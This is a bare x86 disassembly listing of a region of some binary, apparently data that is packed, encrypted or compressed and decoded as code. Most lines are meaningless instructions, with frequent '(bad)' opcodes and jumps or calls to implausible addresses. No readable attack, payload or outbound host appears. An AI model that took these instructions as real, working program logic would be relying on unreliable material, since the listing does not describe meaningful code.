  40eaff:	or     edx,DWORD PTR [ebp+0x5f]
  40eb02:	pop    esi
  40eb03:	(bad)  
  40eb05:	adc    eax,0x8180d453
  40eb0a:	inc    ebp
  40eb0b:	aad    0xab
  40eb0d:	add    al,cl
  40eb0f:	test   al,0xe7
  40eb11:	cli    
  40eb12:	popf   
  40eb13:	ins    DWORD PTR es:[edi],dx
  40eb14:	inc    ebp
  40eb15:	xchg   esi,eax
  40eb16:	leave  
  40eb17:	sbb    esi,DWORD PTR [edx+edx*8+0x66196347]
  40eb1e:	std    
  40eb1f:	shr    BYTE PTR [ebp+0x48],1
  40eb22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb23:	int3   
  40eb24:	mov    ds:0xdd7f010a,eax
  40eb29:	mov    ah,BYTE PTR [ecx+edi*2+0x67ef8ba4]
  40eb30:	pop    ecx
  40eb31:	mov    dl,0x21
  40eb33:	sub    eax,0xbe8bd9db
  40eb38:	pop    ss
  40eb39:	push   edx
  40eb3a:	xchg   ebp,eax
  40eb3b:	add    BYTE PTR [esi],0x32
  40eb3e:	add    ecx,DWORD PTR [edx]
  40eb40:	dec    ecx
  40eb41:	pop    ecx
  40eb42:	sahf   
  40eb43:	ds mov esp,0x39f7c26e
  40eb49:	jmp    0x40eb0a
  40eb4b:	mov    ebp,0xda8239dc
  40eb50:	lea    ebp,[ebx-0x2869c05]
  40eb56:	add    eax,0xa688e0d8
  40eb5b:	add    ecx,0xcb0e466c
  40eb61:	xchg   esp,eax
  40eb62:	dec    BYTE PTR [edi+0x54]
  40eb65:	cmp    DWORD PTR [eax+0x60665039],ecx
  40eb6b:	cmp    BYTE PTR [ebx+0x5b],0x4c
  40eb6f:	push   ebx
  40eb70:	bnd ret 
  40eb72:	call   0xe97d2004
  40eb77:	xchg   esp,eax
  40eb78:	das    
  40eb79:	iret   
  40eb7a:	cwde   
  40eb7b:	sbb    BYTE PTR [esi+esi*8+0x3effb67e],bh
  40eb82:	mov    ecx,0x9b3fc04b
  40eb87:	mov    eax,0xa7697be1
  40eb8c:	jg     0x40eb96
  40eb8e:	mov    bh,0x27
  40eb90:	(bad)  
  40eb91:	jp     0x40ebc9
  40eb93:	aaa    
  40eb94:	enter  0x8f1a,0x9b
  40eb98:	mov    WORD PTR [ebp-0xc],?
  40eb9b:	mov    esp,0xe3fe97bb
  40eba0:	dec    eax
  40eba1:	fwait
  40eba2:	jbe    0x40eb37
  40eba4:	aad    0x25
  40eba6:	dec    ebp
  40eba7:	lock mov esi,0x15eecf2f
  40ebad:	cmp    dl,ch
  40ebaf:	and    BYTE PTR [ebx-0x51],ch
  40ebb2:	in     eax,0x52
  40ebb4:	les    edi,FWORD PTR [ebp-0x1cebc101]
  40ebba:	call   0x7a015d4
  40ebbf:	lock add al,0xe5
  40ebc2:	ins    BYTE PTR es:[edi],dx
  40ebc3:	mov    cx,WORD PTR gs:[edi+eax*4]
  40ebc8:	jb     0x40ec11
  40ebca:	inc    edx
  40ebcb:	in     eax,0x72
  40ebcd:	jg     0x40ec0a
  40ebcf:	jp     0x40eb60
  40ebd1:	jg     0x40ec03
  40ebd3:	jae    0x40ebc8
  40ebd5:	das    
  40ebd6:	add    cl,bh
  40ebd8:	ror    BYTE PTR [edi-0x6bae87af],cl
  40ebde:	jecxz  0x40ec22
  40ebe0:	sbb    esi,ecx
  40ebe2:	push   0xfb127757
  40ebe7:	mov    eax,ds:0x8a2d9560
  40ebec:	add    ebx,DWORD PTR [edi-0x323c394a]
  40ebf2:	add    dh,al
  40ebf4:	ret    
  40ebf5:	ror    BYTE PTR [ebx+0x33],1
  40ebf8:	mov    ss,WORD PTR [edi+0x55]
  40ebfb:	add    BYTE PTR [esi+eiz*4+0x54ec75d2],cl
  40ec02:	out    0x70,al
  40ec04:	popf   
  40ec05:	cmp    al,0xec
  40ec07:	data16 add al,0xa
  40ec0a:	in     eax,dx
  40ec0b:	pop    ds
  40ec0c:	mov    edi,DWORD PTR [edx+0x384e323e]
  40ec12:	and    al,0xe6
  40ec14:	nop
  40ec15:	ins    DWORD PTR es:[edi],dx
  40ec16:	push   ebp
  40ec17:	lods   al,BYTE PTR cs:[esi]
  40ec19:	adc    ecx,DWORD PTR [esi-0x7f]
  40ec1c:	jecxz  0x40ec81
  40ec1e:	mov    ds:0x2b6c2dc5,eax
  40ec23:	push   esi
  40ec24:	cwde   
  40ec25:	mov    al,ds:0xfd53476b
  40ec2a:	ret    0xcb5d
  40ec2d:	rcl    DWORD PTR [esp+ebp*2-0xe],0xe0
  40ec32:	sbb    ecx,DWORD PTR [ebp+0x6edbede2]
  40ec38:	xor    DWORD PTR [edx-0x76],ebx
  40ec3b:	inc    esp
  40ec3c:	jge    0x40ebd4
  40ec3e:	and    esp,ebp
  40ec40:	mov    dl,0x12
  40ec42:	dec    ebp
  40ec43:	inc    esp
  40ec44:	test   BYTE PTR [edx],dl
  40ec46:	add    esi,DWORD PTR ds:0x543af6aa
  40ec4c:	jno    0x40ec14
  40ec4e:	dec    BYTE PTR [esp+ecx*8-0xbd903e6]
  40ec55:	(bad)  
  40ec56:	mov    ebp,0xc861aa5b
  40ec5b:	in     eax,0x1d
  40ec5d:	loop   0x40ec85
  40ec5f:	js     0x40eca1
  40ec61:	xchg   edi,eax
  40ec62:	retf   
  40ec63:	dec    edx
  40ec64:	cwde   
  40ec65:	push   esi
  40ec66:	call   0xf07b:0x847b4cfa
  40ec6d:	cmp    edi,DWORD PTR [ebp-0x5fad9bbc]
  40ec73:	sbb    dh,cl
  40ec75:	fcmovne st,st(3)
  40ec77:	inc    ebp
  40ec78:	cs ins DWORD PTR es:[edi],dx
  40ec7a:	inc    esp
  40ec7b:	xchg   ebp,eax
  40ec7c:	jmp    0x40ecb2
  40ec7e:	mov    dh,0xd6
  40ec80:	mov    edx,0x664322e
  40ec85:	push   edx
  40ec86:	in     eax,0xd1
  40ec88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec89:	aam    0x98
  40ec8b:	adc    BYTE PTR [edx-0x41443467],ah
  40ec91:	loope  0x40ecd1
  40ec93:	sub    al,0xa8
  40ec95:	push   esp
  40ec96:	sub    al,0x31
  40ec98:	add    al,0x0
  40ec9a:	xor    DWORD PTR [ebp-0x4b],esp
  40ec9d:	fcom   QWORD PTR [edx]
  40ec9f:	cld    
  40eca0:	popf   
  40eca1:	sahf   
  40eca2:	xchg   esp,eax
  40eca3:	test   eax,0xa9c99f43
  40eca8:	cmp    DWORD PTR [ebp-0x15],edi
  40ecab:	mov    bh,0x6b
  40ecad:	xchg   edx,eax
  40ecae:	xchg   ebx,eax
  40ecaf:	xor    BYTE PTR [eax-0x1f9449af],dh
  40ecb5:	stc    
  40ecb6:	inc    edx
  40ecb7:	fnstcw WORD PTR [ecx+edi*8+0x6f2e8d78]
  40ecbe:	scas   al,BYTE PTR es:[edi]
  40ecbf:	out    dx,eax
  40ecc0:	mov    ch,0x27
  40ecc2:	out    0x64,eax
  40ecc4:	cmp    BYTE PTR [edi+0x6baef61e],dh
  40ecca:	inc    ebp
  40eccb:	mov    al,0xf6
  40eccd:	mov    edi,0x4527e565
  40ecd2:	push   edx
  40ecd3:	retf   0x65af
  40ecd6:	xor    al,0xf1
  40ecd8:	imul   esp,ecx,0xffffffe7
  40ecdb:	pop    edx
  40ecdc:	push   0xd52bf96e
  40ece1:	gs inc eax
  40ece3:	loopne 0x40ec66
  40ece5:	cwde   
  40ece6:	daa    
  40ece7:	ret    
  40ece8:	mov    edx,0x167a384
  40eced:	mov    ds:0x70b747b,ax
  40ecf3:	dec    edi
  40ecf4:	mov    ch,0xca
  40ecf6:	(bad)  
  40ecf7:	lahf   
  40ecf8:	pop    ebx
  40ecf9:	sub    DWORD PTR [edx+0xdd009d7],0x28dee10c
  40ed03:	pop    eax
  40ed04:	ficom  DWORD PTR [eax+0x77]
  40ed07:	(bad)
  40ed0c:	dec    esi
  40ed0d:	sub    DWORD PTR [ebx+0x42],ecx
  40ed10:	mov    BYTE PTR [ecx-0x4a],bh
  40ed13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed15:	out    dx,al
  40ed16:	inc    esi
  40ed17:	add    DWORD PTR [esi-0x4e114ac7],esp
  40ed1d:	cdq    
  40ed1e:	js     0x40ecca
  40ed20:	sar    BYTE PTR [eax+esi*8+0x11],cl
  40ed24:	mov    eax,ds:0xc7de07b6
  40ed29:	sub    ebp,ebx
  40ed2b:	mov    ecx,0xfa6b1903
  40ed30:	bound  edi,QWORD PTR [ebx+0x6f]
  40ed33:	pop    ds
  40ed34:	dec    ecx
  40ed35:	cmp    al,0xae
  40ed37:	pop    ss
  40ed38:	sbb    eax,DWORD PTR [edi-0x1a85798d]
  40ed3e:	rcr    DWORD PTR [ecx+0xc],1
  40ed41:	div    BYTE PTR [esi+eax*2]
  40ed44:	comiss xmm3,DWORD PTR [ebx-0x7f]
  40ed48:	mov    ?,WORD PTR [ebx]
  40ed4a:	xlat   BYTE PTR ds:[ebx]
  40ed4b:	sbb    cl,bh
  40ed4d:	shr    DWORD PTR [edx-0x4a],1
  40ed50:	stc    
  40ed51:	push   edi
  40ed52:	cmp    BYTE PTR [eax+0x1efdc524],dh
  40ed58:	dec    ebx
  40ed59:	adc    DWORD PTR [esp+ebp*2+0x14],ebp
  40ed5d:	cmovg  edi,DWORD PTR [ebx+0x7f]
  40ed61:	adc    dl,BYTE PTR fs:[edi-0x4c]
  40ed65:	sub    al,0x30
  40ed67:	dec    ebp
  40ed68:	push   ebp
  40ed69:	inc    edx
  40ed6a:	pusha  
  40ed6b:	mov    WORD PTR [ebx-0x23],cs
  40ed6e:	adc    al,0x78
  40ed70:	(bad)  
  40ed72:	scas   eax,DWORD PTR es:[edi]
  40ed73:	sbb    al,0x10
  40ed75:	xchg   ecx,eax
  40ed76:	push   eax
  40ed77:	lock push eax
  40ed79:	bound  esi,QWORD PTR [eax+0x5191fb79]
  40ed7f:	mov    cl,0xa4
  40ed81:	loopne 0x40edea
  40ed83:	cmp    esi,DWORD PTR [ebx+ebp*1+0x5f]
  40ed87:	fiadd  WORD PTR [edx]
  40ed89:	sbb    bh,BYTE PTR [esp+ebx*4-0x10]
  40ed8d:	sbb    BYTE PTR [edx+0x616e8b07],ch
  40ed93:	xchg   esi,eax
  40ed94:	lahf   
  40ed95:	jl     0x40edba
  40ed97:	cmp    al,0xc0
  40ed99:	pop    ebp
  40ed9a:	and    bl,BYTE PTR [ecx+0x47]
  40ed9d:	jb     0x40ed8f
  40ed9f:	shr    DWORD PTR [esi-0x28efa9dd],0xf5
  40eda6:	jbe    0x40ee01
  40eda8:	xor    bl,BYTE PTR [esi+0x32b0ac26]
  40edae:	sub    eax,0x396376bc
  40edb3:	sub    BYTE PTR [eax],dh
  40edb5:	dec    esi
  40edb6:	fsubrp st(0),st
  40edb8:	jg     0x40edfd
  40edba:	sub    dh,BYTE PTR ds:0xdaf7dfc6
  40edc0:	xchg   edx,ebx
  40edc2:	jne    0x40edcb
  40edc4:	pop    ebp
  40edc5:	push   edx
  40edc6:	jne    0x40ed6c
  40edc8:	(bad)  
  40edc9:	clc    
  40edca:	cmp    edi,DWORD PTR [esi+0x6ba53b7d]
  40edd0:	jb     0x40ed75
  40edd2:	pop    esp
  40edd3:	or     dh,BYTE PTR [esi+0x1]
  40edd6:	dec    ebp
  40edd7:	sbb    BYTE PTR [ecx+edi*2],0x40
  40eddb:	ss add eax,0xa48ab8bb
  40ede1:	pop    ss
  40ede2:	mov    ecx,0x5a39bc6b
  40ede7:	jp     0x40ee4f
  40ede9:	cs aad 0xc3
  40edec:	mov    edi,0x96384fe3
  40edf1:	push   ebp
  40edf2:	push   ss
  40edf3:	push   es
  40edf4:	xchg   esp,edx
  40edf6:	mov    ah,0xf1
  40edf8:	dec    edx
  40edf9:	(bad)  
  40edfa:	in     al,dx
  40edfb:	out    0x3e,al
  40edfd:	and    DWORD PTR [ebx-0x3568fb88],eax
  40ee03:	inc    esi
  40ee04:	pop    edi
  40ee05:	mov    ch,0x7c
  40ee07:	retf   0x6c9e
  40ee0a:	pop    esp
  40ee0b:	retf   
  40ee0c:	jmp    0xda2dd667
  40ee11:	out    0x3f,al
  40ee13:	push   cs
  40ee14:	test   DWORD PTR [esi],esi
  40ee16:	cld    
  40ee17:	inc    esp
  40ee18:	xor    eax,0x4f85e9df
  40ee1d:	push   esi
  40ee1e:	mov    al,ds:0xb275af8f
  40ee23:	enter  0x2fa5,0xc7
  40ee27:	je     0x40ee6b
  40ee29:	jg     0x40ee6a
  40ee2b:	cmc    
  40ee2c:	int3   
  40ee2d:	mov    ebx,0x6cd8f28f
  40ee32:	pop    ebx
  40ee33:	pop    edi
  40ee34:	lods   eax,DWORD PTR ds:[esi]
  40ee35:	das    
  40ee36:	or     edx,DWORD PTR [ebx-0x324172d3]
  40ee3c:	sub    eax,DWORD PTR [edx-0x7d64abd2]
  40ee42:	mov    eax,0x48806e27
  40ee47:	or     DWORD PTR ds:[esi+0x3],ebp
  40ee4b:	shl    DWORD PTR [edx],cl
  40ee4d:	(bad)  
  40ee4f:	repnz popf 
  40ee51:	mov    cl,0xb3
  40ee53:	mov    ebp,0x1e09329b
  40ee58:	in     al,0x62
  40ee5a:	in     eax,0x69
  40ee5c:	pusha  
  40ee5d:	das    
  40ee5e:	xchg   ecx,eax
  40ee5f:	cmp    ch,bh
  40ee61:	int    0x38
  40ee63:	sbb    al,0x1c
  40ee65:	jecxz  0x40eed7
  40ee67:	fnsave [edi+0x32]
  40ee6a:	xchg   DWORD PTR fs:[edx+0x23],ebp
  40ee6e:	pushf  
  40ee6f:	movlps xmm1,QWORD PTR [esi-0x5115bcfb]
  40ee76:	or     BYTE PTR gs:[ebp-0x74f1b0f7],al
  40ee7d:	mov    ebp,0x17eeb81
  40ee82:	dec    DWORD PTR [edx-0x5d]
  40ee85:	call   0xfc45:0x8b00413b
  40ee8c:	xor    eax,edi
  40ee8e:	add    eax,esi
  40ee90:	mov    ds:0x413b92,eax
  40ee95:	jmp    0x40f25b
  40ee9a:	push   edi
  40ee9b:	mov    DWORD PTR ds:0x7d73cde7,eax
  40eea1:	test   eax,0x57232fd2
  40eea6:	and    eax,ebp
  40eea8:	stos   BYTE PTR es:[edi],al
  40eea9:	or     eax,0x7c7ca93e
  40eeae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeaf:	jns    0x40ef2d
  40eeb1:	jl     0x40eef4
  40eeb3:	popa   
  40eeb4:	or     BYTE PTR [ebp+0x1e],ch
  40eeb7:	pop    eax
  40eeb8:	call   0x4f35:0x93d21bac
  40eebf:	and    al,0x95
  40eec1:	repnz in al,dx
  40eec3:	iret   
  40eec4:	stos   DWORD PTR es:[edi],eax
  40eec5:	sbb    DWORD PTR [esi],ecx
  40eec7:	adc    edi,DWORD PTR [esi+ecx*1+0x8923aed]
  40eece:	aas    
  40eecf:	or     BYTE PTR [eax],bl
  40eed1:	xlat   BYTE PTR ds:[ebx]
  40eed2:	inc    eax
  40eed3:	xor    BYTE PTR [edx],0x1c
  40eed6:	and    edx,esi
  40eed8:	mov    edx,0x33eba18
  40eedd:	mov    ds:0x2c69657e,eax
  40eee2:	cmp    ebp,DWORD PTR [esi]
  40eee4:	or     DWORD PTR [ebx-0x532dc5f3],ebp
  40eeea:	mov    esi,DWORD PTR [esi]
  40eeec:	push   eax
  40eeed:	out    dx,eax
  40eeee:	gs lahf 
  40eef0:	std    
  40eef1:	xor    BYTE PTR [esp+eiz*4+0x72dca38c],al
  40eef8:	out    dx,al
  40eef9:	mov    ah,0x15
  40eefb:	jmp    0x40ef2f
  40eefd:	out    dx,eax
  40eefe:	es std 
  40ef00:	xor    DWORD PTR [ecx],ebp
  40ef02:	ror    BYTE PTR [edx-0x44],cl
  40ef05:	leave  
  40ef06:	xor    ah,BYTE PTR [edi]
  40ef08:	and    eax,0x9a2bd24e
  40ef0d:	leave  
  40ef0e:	bound  esp,QWORD PTR [ebp+0x7e]
  40ef11:	inc    esp
  40ef12:	adc    al,0x1
  40ef14:	ret    0xd0b5
  40ef17:	call   0x268d24ef
  40ef1c:	bound  ecx,QWORD PTR [ecx+ebp*4+0x69]
  40ef20:	fmul   DWORD PTR [eax]
  40ef22:	add    al,0xb
  40ef24:	push   ecx
  40ef25:	repz loop 0x40eebe
  40ef28:	std    
  40ef29:	enter  0xa274,0xc9
  40ef2d:	sub    BYTE PTR [edx-0x1a],ch
  40ef30:	jo     0x40eee2
  40ef32:	dec    esi
  40ef33:	mov    ebp,0x6f84ac5a
  40ef38:	fdiv   st,st(1)
  40ef3a:	fcmove st,st(5)
  40ef3c:	(bad)  
  40ef3d:	pop    edi
  40ef3e:	leave  
  40ef3f:	addr16 cld 
  40ef41:	pop    es
  40ef42:	aaa    
  40ef43:	sbb    ah,cl
  40ef45:	pop    ds
  40ef46:	loope  0x40eed1
  40ef48:	fs jo  0x40ef28
  40ef4b:	fisubr WORD PTR [ebp+edi*8+0x5bd2cf93]
  40ef52:	cdq    
  40ef53:	aad    0x4
  40ef55:	mov    bl,0xd5
  40ef57:	sub    DWORD PTR [edx-0x3b],ebp
  40ef5a:	lea    eax,[ebx-0x31]
  40ef5d:	lahf   
  40ef5e:	xchg   esi,eax
  40ef5f:	das    
  40ef60:	xor    BYTE PTR [edx+0x74],bh
  40ef63:	push   ds
  40ef64:	(bad)  
  40ef65:	rcr    BYTE PTR [esi],cl
  40ef67:	pop    edx
  40ef68:	sub    ecx,DWORD PTR [edx-0x7]
  40ef6b:	add    ecx,esp
  40ef6d:	fistp  WORD PTR [ebx-0x3c64d390]
  40ef73:	and    BYTE PTR [ecx],0x81
  40ef76:	jns    0x40ef41
  40ef78:	arpl   si,si
  40ef7a:	imul   edx,ebp,0x58
  40ef7d:	cwde   
  40ef7e:	loop   0x40ef6c
  40ef80:	and    BYTE PTR [esi+0x13],0x26
  40ef84:	sbb    al,0x84
  40ef86:	idiv   DWORD PTR [eax-0x1d332134]
  40ef8c:	add    DWORD PTR [ecx+0x70a226fd],0x1e
  40ef93:	scas   eax,DWORD PTR es:[edi]
  40ef94:	mov    ds:0x292ba425,al
  40ef99:	push   es
  40ef9a:	loope  0x40ef4d
  40ef9c:	dec    edx
  40ef9d:	mov    eax,0x2e2c12ea
  40efa2:	cs inc esi
  40efa4:	fist   WORD PTR ds:[esi-0x43]
  40efa9:	jg     0x40ef6f
  40efab:	mov    edx,0x166eca11
  40efb0:	sbb    bh,al
  40efb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efb3:	mov    dl,dh
  40efb5:	adc    esi,DWORD PTR [ebp+ecx*8-0xd]
  40efb9:	int    0xe
  40efbb:	jg     0x40f012
  40efbd:	mov    ebx,0x38bae082
  40efc2:	in     eax,0x40
  40efc4:	xor    BYTE PTR ds:0x97aa67d7,0x7
  40efcb:	fcomp  DWORD PTR [ebx]
  40efcd:	add    eax,0xa10995f1
  40efd2:	xor    al,0xe4
  40efd4:	pop    eax
  40efd5:	dec    eax
  40efd6:	xchg   DWORD PTR [edx],esp
  40efd8:	sbb    BYTE PTR [esi+0x2c],dh
  40efdb:	add    DWORD PTR [edx+0x1d],ecx
  40efde:	add    dh,dl
  40efe0:	es mov dl,0xa8
  40efe3:	jne    0x40ef8d
  40efe5:	mov    dh,0xca
  40efe7:	imul   edi,ebp,0x1a3fd8a9
  40efed:	out    0x92,eax
  40efef:	jns    0x40f033
  40eff1:	scas   eax,DWORD PTR es:[edi]
  40eff2:	neg    DWORD PTR [ecx-0x3e]
  40eff5:	int    0xc2
  40eff7:	push   edx
  40eff8:	mov    eax,ss:0x10304395
  40effe:	loope  0x40f039
  40f000:	sub    ecx,DWORD PTR [eax]
  40f002:	sar    DWORD PTR [ecx-0x5],cl
  40f005:	mov    al,dl
  40f007:	jp     0x40f02b
  40f009:	outs   dx,DWORD PTR ds:[esi]
  40f00a:	mov    esp,0xf08dfd11
  40f00f:	or     eax,edi
  40f011:	test   BYTE PTR [eax],dl
  40f013:	test   DWORD PTR [esi-0x15],eax
  40f016:	fild   WORD PTR [ebx+edi*4]
  40f019:	imul   edx,DWORD PTR [esi+0x4a56e27b],0xe1aa5e78
  40f023:	cmp    eax,0x593ba1b
  40f028:	dec    eax
  40f029:	out    0xe1,eax
  40f02b:	xor    esp,esi
  40f02d:	shl    BYTE PTR [eax-0x3a86e9c7],cl
  40f033:	stc    
  40f034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f035:	push   ds
  40f036:	dec    edx
  40f037:	mov    dl,0x48
  40f039:	mov    esp,0x36b0d6b9
  40f03e:	(bad)  
  40f03f:	mov    ecx,0x97dc4dfd
  40f044:	adc    esi,DWORD PTR [ecx+eax*1+0x680db6e9]
  40f04b:	adc    eax,0x806274be
  40f050:	fwait
  40f051:	xchg   esi,eax
  40f052:	pop    ebp
  40f053:	vandnps xmm6,xmm7,xmm0
  40f057:	icebp  
  40f058:	leave  
  40f059:	(bad)  
  40f05a:	cli    
  40f05b:	scas   eax,DWORD PTR es:[edi]
  40f05c:	fmul   DWORD PTR [esi-0x1e]
  40f05f:	add    ah,ch
  40f061:	xchg   BYTE PTR [edx],dl
  40f063:	ja     0x40f0a2
  40f065:	mov    edi,0x5d50e51
  40f06a:	and    eax,0x96f933a6
  40f06f:	pushf  
  40f070:	cdq    
  40f071:	int    0x87
  40f073:	cs or  DWORD PTR cs:[edi+ecx*8+0x7],esi
  40f079:	cmp    eax,0xc3b7129d
  40f07e:	mov    ds:0x50a2feb,eax
  40f083:	enter  0xa947,0x66
  40f087:	push   eax
  40f088:	jg     0x40f0f0
  40f08a:	xchg   BYTE PTR [esi-0x9],dh
  40f08d:	xchg   esp,eax
  40f08e:	repz pop edi
  40f090:	inc    ecx
  40f091:	xlat   BYTE PTR ds:[ebx]
  40f092:	out    dx,al
  40f093:	aas    
  40f094:	mov    bh,0x56
  40f096:	retf   0x4bbf
  40f099:	in     eax,dx
  40f09a:	cld    
  40f09b:	xor    DWORD PTR [ecx-0x35],edx
  40f09e:	stc    
  40f09f:	retf   
  40f0a0:	mov    WORD PTR [edx],ds
  40f0a2:	mov    al,ds:0x747febd1
  40f0a7:	sar    BYTE PTR [eax+0x75d96261],0xd3
  40f0ae:	pop    esi
  40f0af:	inc    edi
  40f0b0:	inc    eax
  40f0b1:	mov    bl,ah
  40f0b3:	ret    0x3fe4
  40f0b6:	cmp    ebx,DWORD PTR [ebp-0x6d]
  40f0b9:	xchg   ecx,eax
  40f0ba:	gs rcr ah,0xe5
  40f0be:	mov    dl,0xcc
  40f0c0:	adc    BYTE PTR [edi],dh
  40f0c2:	iret   
  40f0c3:	xchg   esi,esp
  40f0c5:	mov    esp,0x393dcd49
  40f0ca:	add    cl,ah
  40f0cc:	outs   dx,DWORD PTR ds:[esi]
  40f0cd:	inc    BYTE PTR [edi-0xb]
  40f0d0:	xchg   ebp,eax
  40f0d1:	les    eax,FWORD PTR [eax+0x4a]
  40f0d4:	ins    DWORD PTR es:[edi],dx
  40f0d5:	(bad)  
  40f0d6:	gs gs and bh,bl
  40f0da:	push   ebx
  40f0db:	mov    edi,0x4da682b
  40f0e0:	jbe    0x40f10a
  40f0e2:	fmul   QWORD PTR [ecx]
  40f0e4:	mov    edx,DWORD PTR [esi-0x26]
  40f0e7:	shl    BYTE PTR [ecx-0x50],0xa5
  40f0eb:	push   esi
  40f0ec:	int3   
  40f0ed:	xor    al,0xd0
  40f0ef:	rcl    DWORD PTR ss:[edx+0x8],0xc7
  40f0f4:	xchg   ebp,eax
  40f0f5:	pusha  
  40f0f6:	stos   DWORD PTR es:[edi],eax
  40f0f7:	loope  0x40f0bb
  40f0f9:	das    
  40f0fa:	cmp    eax,0xa4e3e538
  40f0ff:	cmp    DWORD PTR [ecx-0x9c2be39],esp
  40f105:	stc    
  40f106:	retf   0x30b3
  40f109:	mov    cl,0x67
  40f10b:	arpl   di,sp
  40f10d:	pop    ecx
  40f10e:	clc    
  40f10f:	in     eax,0xe1
  40f111:	dec    esp
  40f112:	mov    cl,0x6d
  40f114:	clc    
  40f115:	ss jo  0x40f10c
  40f118:	or     ecx,ebx
  40f11a:	dec    esp
  40f11b:	out    dx,al
  40f11c:	pop    ss
  40f11d:	and    dl,BYTE PTR [edx-0x1]
  40f120:	jae    0x40f107
  40f122:	xor    bl,BYTE PTR [edx+0x58a2a4a1]
  40f128:	add    esi,DWORD PTR [esi+0x7c]
  40f12b:	mov    ecx,edi
  40f12d:	xchg   DWORD PTR [eax-0x19],esp
  40f130:	and    eax,ebp
  40f132:	xchg   edx,eax
  40f133:	out    dx,al
  40f134:	aad    0x5b
  40f136:	push   ecx
  40f137:	sub    DWORD PTR [esi],edx
  40f139:	fs daa 
  40f13b:	nop
  40f13c:	xchg   DWORD PTR [eax-0x71],esi
  40f13f:	add    eax,0x9200c0aa
  40f144:	rcr    DWORD PTR [edx-0xd],1
  40f147:	push   ecx
  40f148:	fwait
  40f149:	gs aas 
  40f14b:	pushf  
  40f14c:	xor    ebp,edi
  40f14e:	xchg   esp,eax
  40f14f:	addr16 mov eax,0x8ab2f0b3
  40f155:	ss scas eax,DWORD PTR es:[edi]
  40f157:	add    al,0x5c
  40f159:	jle    0x40f169
  40f15b:	daa    
  40f15c:	test   esi,edi
  40f15e:	push   ebp
  40f15f:	pop    esp
  40f160:	push   esp
  40f161:	mov    eax,DWORD PTR [ecx]
  40f163:	aaa    
  40f164:	mov    BYTE PTR [edx],al
  40f166:	nop
  40f167:	and    DWORD PTR gs:[ebx+0x10],ebx
  40f16b:	(bad)  
  40f16c:	jg     0x40f1a4
  40f16e:	nop
  40f16f:	retf   
  40f170:	jns    0x40f151
  40f172:	cmp    al,0x1d
  40f174:	jmp    0xf350a909
  40f179:	out    0xdc,al
  40f17b:	add    esi,DWORD PTR [edx-0x68]
  40f17e:	mov    ds:0x19b846a0,eax
  40f183:	adc    al,0x41
  40f185:	mov    cl,BYTE PTR [edi+0x6ff86e4a]
  40f18b:	sbb    ah,dh
  40f18d:	pop    edi
  40f18e:	push   eax
  40f18f:	sub    edi,ecx
  40f191:	mov    esp,0x5ca4cf9
  40f196:	mov    dh,0x7e
  40f198:	fwait
  40f199:	xchg   DWORD PTR [esi],esi
  40f19b:	and    ebx,DWORD PTR [eax+edi*8-0x3f5a583a]
  40f1a2:	ins    BYTE PTR es:[edi],dx
  40f1a3:	push   ebx
  40f1a4:	(bad)  
  40f1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1a6:	jle    0x40f21f
  40f1a8:	ja     0x40f162
  40f1aa:	jnp    0x40f1a1
  40f1ac:	lods   al,BYTE PTR ds:[esi]
  40f1ad:	mov    ebp,0x65367cb0
  40f1b2:	xor    ah,BYTE PTR [edi-0x1bd86e0d]
  40f1b8:	push   cs
  40f1b9:	push   ebx
  40f1ba:	mov    dl,0x20
  40f1bc:	mov    DWORD PTR [ecx+0x73264f2c],edi
  40f1c2:	and    BYTE PTR [edi],0xc7
  40f1c5:	stos   BYTE PTR es:[edi],al
  40f1c6:	xchg   ebx,eax
  40f1c7:	jle    0x40f21f
  40f1c9:	fwait
  40f1ca:	push   ecx
  40f1cb:	repnz (bad) 
  40f1cd:	jp     0x40f1db
  40f1cf:	sbb    esp,DWORD PTR [edi]
  40f1d1:	jbe    0x40f153
  40f1d3:	sub    BYTE PTR [edi+edx*8+0x4e0b5b35],0xa0
  40f1db:	add    eax,0xa1826bb6
  40f1e0:	jb     0x40f1c9
  40f1e2:	lods   eax,DWORD PTR ds:[esi]
  40f1e3:	popf   
  40f1e4:	cmp    BYTE PTR [ebp-0x2b],dh
  40f1e7:	push   0xffffffa6
  40f1e9:	add    al,0x4
  40f1eb:	inc    DWORD PTR [ecx+0x671384e1]
  40f1f1:	or     al,0x31
  40f1f3:	cdq    
  40f1f4:	les    ebx,FWORD PTR [eax]
  40f1f6:	mov    eax,0x6b5bf670
  40f1fb:	out    dx,al
  40f1fc:	int    0x65
  40f1fe:	and    BYTE PTR [ecx+edi*2+0x7a],dh
  40f202:	pop    ebp
  40f203:	push   cs
  40f204:	sbb    eax,DWORD PTR [ebx-0x4d]
  40f207:	xor    al,0xa
  40f209:	lock dec esi
  40f20b:	mov    ecx,0xbc90f334
  40f210:	dec    edi
  40f211:	fst    DWORD PTR [edx-0x57]
  40f214:	imul   ebx,DWORD PTR [edi],0xe
  40f217:	dec    ecx
  40f218:	sar    DWORD PTR [eax-0x49],0xe8
  40f21c:	in     eax,0xb0
  40f21e:	arpl   WORD PTR [esi],bx
  40f220:	xchg   BYTE PTR [ecx-0x7176e04f],bl
  40f226:	push   eax
  40f227:	xor    ebx,DWORD PTR [edx-0x3704ff32]
  40f22d:	push   cs
  40f22e:	push   0xa8ea44f2
  40f233:	mov    BYTE PTR [ecx+ecx*8-0x24d2ab8d],cl
  40f23a:	test   DWORD PTR [ecx-0x4c],edi
  40f23d:	popa   
  40f23e:	jmp    0xb5ae005c
  40f243:	push   ecx
  40f244:	scas   al,BYTE PTR es:[edi]
  40f245:	loopne 0x40f29b
  40f247:	jno    0x40f28f
  40f249:	lock fild WORD PTR [edx-0x5b]
  40f24d:	sub    eax,ecx
  40f24f:	popa   
  40f250:	scas   al,BYTE PTR es:[edi]
  40f251:	aam    0x86
  40f253:	lahf   
  40f254:	faddp  st(6),st
  40f256:	sbb    BYTE PTR [ecx],cl
  40f258:	jle    0x40f2d9
  40f25a:	adc    bh,bh
  40f25c:	jne    0x40f256
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
